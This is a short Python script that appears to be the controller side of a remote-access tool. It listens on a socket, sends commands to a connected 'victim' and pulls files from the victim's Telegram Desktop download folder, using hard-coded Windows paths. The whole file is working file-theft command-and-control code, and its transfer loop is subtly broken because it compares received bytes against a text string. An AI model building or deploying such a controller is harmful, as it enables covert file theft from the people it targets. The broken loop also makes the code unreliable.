import os
import socket


def server():
    s = socket.socket()
    s.bind(('127.0.0.1', 8965))

    s.listen(1)
    client_socket, adress = s.accept()
    print("Connection from: " + str(adress))
    while True:
        #command = input('Please enter a command to the victim\n')
        command = 'get file C:\\Users\\avita\\Downloads\\Telegram Desktop\\t.txt'
        client_socket.send(command.encode('utf-8'))

        if 'get file ' in command:
            #file_path = input("Please enter the path of the file")
            file_path = 'C:\\Users\\avita\\Downloads\\Telegram Desktop\\a.txt'
            data = None
            size = 0
            with open(file_path, 'wb')as file:
                while data != 'complete':
                    print('Enter')
                    client_socket.sendall('ok'.encode('utf-8'))
                    data = client_socket.recv(1024)
                    size += len(data)
                    print(f'Size is {size}')
                    file.write(data)
                    file.flush()
                    statinfo = os.stat(file_path)
                    print(f'File Size is {statinfo.st_size}')
                statinfo = os.stat(file_path)
                print(f'Before last: File Size is {statinfo.st_size}')
                #file.write(data)
                file.flush()
                file.close()
                print(f'Before last: File Size is {statinfo.st_size}')
        else:
            data = client_socket.recv(1024)
            print('From victim: ' + data.decode('utf-8'))

    client_socket.close()


if __name__ == '__main__':
    server()
